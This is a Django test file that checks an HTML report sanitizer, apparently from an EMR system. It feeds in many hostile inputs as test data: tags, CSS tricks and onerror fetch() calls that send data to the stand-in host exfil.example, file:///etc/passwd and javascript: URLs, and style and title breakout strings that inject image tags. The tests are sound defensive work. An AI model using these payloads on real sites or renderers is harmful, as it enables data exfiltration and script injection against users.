from django.test import SimpleTestCase
from tinyhtml5 import parse

from care.emr.reports.renderer.generators.html_generator import (
    HTMLGenerator,
    HTMLGeneratorOptions,
)
from care.emr.reports.renderer.html_sanitizer import REPORT_CONTENT_SECURITY_POLICY

INLINE_IMAGE = (
    "data:image/png;base64,"
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/l9sAAAAASUVORK5CYII="
)


class ReportHTMLSecurityTests(SimpleTestCase):
    def setUp(self):
        self.generator = HTMLGenerator()

    def test_removes_external_resource_attributes_and_active_markup(self):
        url = "https://exfil.example/secret"
        html = f"""
            <base href="{url}">
            <meta http-equiv="refresh" content="0;url={url}">
            <link rel="stylesheet" href="{url}">
            <script src="{url}">fetch('{url}')</script>
            <iframe src="{url}" srcdoc="&lt;img src='{url}'&gt;"></iframe>
            <object data="{url}"></object>
            <form action="{url}"><input type="image" src="{url}"></form>
            <svg><image href="{url}" /></svg>
            <math><mtext><img src="{url}"></mtext></math>
            <table background="{url}"><tr><td>Report</td></tr></table>
            <img src="{url}" srcset="{url} 2x" onerror="fetch('{url}')">
            <a href="#report" ping="{url}">Report</a>
        """
        result = self.generator.generate(html).decode()
        self.assertNotIn(url, result)
        self.assertNotIn("onerror", result)
        self.assertNotIn("srcdoc", result)
        self.assertIn("Report", result)

    def test_css_cannot_fetch_resources_including_escaped_or_string_urls(self):
        url = "https://exfil.example/secret"
        styles = [
            f'@import "{url}";',
            f'@import url("{url}");',
            f'p {{background: url("{url}")}}',
            f'p {{background: u\\72l("{url}")}}',
            f'p {{background: image-set("{url}" 1x)}}',
            f'p {{background: -webkit-image-set("{url}" 1x)}}',
            f'p {{background: src("{url}")}}',
            f'@font-face {{font-family: remote; src: url("{url}")}}',
            f'@media print {{p {{background: url("{url}")}}}}',
            f'p {{--resource: url("{url}"); background: var(--resource)}}',
            f'p {{& span {{background: url("{url}")}}}}',
        ]
        for style in styles:
            with self.subTest(style=style):
                result = self.generator.generate(f"<style>{style}</style><p>Report</p>")
                self.assertNotIn(url.encode(), result)
                self.assertIn(b"Report", result)
        result = self.generator.generate(
            f'<p style="color:red; background: url({url})">Report</p>'
        )
        self.assertNotIn(url.encode(), result)
        self.assertIn(b"color:red", result)

    def test_preserves_report_layout_inline_images_and_intentional_links(self):
        html = f"""
            <style>
                @page {{ size: A4; margin: 1cm;
                    @bottom-center {{ content: counter(page); }}
                }}
                @media print {{ p {{ color: rgb(0, 0, 0); }} }}
                td:nth-child(2) {{ width: calc(100% - 1cm); }}
            </style>
            <h1 id="report">Report</h1>
            <table><tr><td colspan="2" style="padding:4px">Clinical details</td></tr></table>
            <img src="{INLINE_IMAGE}" alt="Logo">
            <a href="https://care.example/download/report">Download</a>
        """
        result = self.generator.generate(html).decode()
        root = parse(result, namespace_html_elements=False)
        self.assertEqual(root.find(".//img").get("src"), INLINE_IMAGE)
        self.assertEqual(root.find(".//td").get("colspan"), "2")
        self.assertEqual(root.find(".//td").get("style"), "padding:4px;")
        self.assertIn("Clinical details", result)
        for css in (
            "@page",
            "@bottom-center",
            "counter(page)",
            "rgb(0, 0, 0)",
            "calc(",
        ):
            self.assertIn(css, result)
        self.assertIn('href="https://care.example/download/report"', result)

    def test_only_raster_data_images_and_safe_link_schemes_are_kept(self):
        for url in (
            "file:///etc/passwd",
            "//exfil.example/secret",
            "/private-resource",
            "data:image/svg+xml,<svg></svg>",
            "data:text/html,<script>alert(1)</script>",
            "javascript:alert(1)",
        ):
            with self.subTest(url=url):
                result = self.generator.generate(f'<img src="{url}">').decode()
                self.assertIsNone(
                    parse(result, namespace_html_elements=False)
                    .find(".//img")
                    .get("src")
                )
        for url in ("javascript:alert(1)", "java\nscript:alert(1)", "data:text/html,x"):
            with self.subTest(link=url):
                result = self.generator.generate(f'<a href="{url}">Click</a>').decode()
                self.assertIsNone(
                    parse(result, namespace_html_elements=False)
                    .find(".//a")
                    .get("href")
                )

    def test_css_strings_cannot_break_out_when_html_is_parsed_again(self):
        html = """
            <p style='--label: "</style><img src=https://exfil.example/secret>";'>Report</p>
            <style>p::after { content: "&lt;/style&gt;"; }</style>
        """
        result = self.generator.generate(html).decode()
        # Reparse the serialized document, as the browser preview does.
        root = parse(result, namespace_html_elements=False)
        self.assertEqual(list(root.iter("img")), [])
        self.assertIn("Report", result)

    def test_csp_is_carried_in_saved_html_and_response_headers(self):
        content = self.generator.generate(
            '<meta http-equiv="Content-Security-Policy" content="default-src *">'
            "<p>Report</p>"
        )
        root = parse(content.decode(), namespace_html_elements=False)
        metas = root.findall("./head/meta")
        self.assertEqual(metas[0].get("charset"), "utf-8")
        self.assertEqual(metas[1].get("content"), REPORT_CONTENT_SECURITY_POLICY)
        self.assertEqual(len(metas), 2)
        response = self.generator.get_http_response(content)
        self.assertEqual(
            response["Content-Security-Policy"], REPORT_CONTENT_SECURITY_POLICY
        )
        self.assertEqual(response["X-Content-Type-Options"], "nosniff")

    def test_wrapped_document_options_are_escaped(self):
        result = self.generator.generate(
            "<p>Report</p>",
            HTMLGeneratorOptions(
                wrap_document=True, title="</title><img src='https://exfil.example'>"
            ),
        ).decode()
        root = parse(result, namespace_html_elements=False)
        self.assertEqual(list(root.iter("img")), [])
        self.assertEqual(
            root.find("./head/title").text, "</title><img src='https://exfil.example'>"
        )
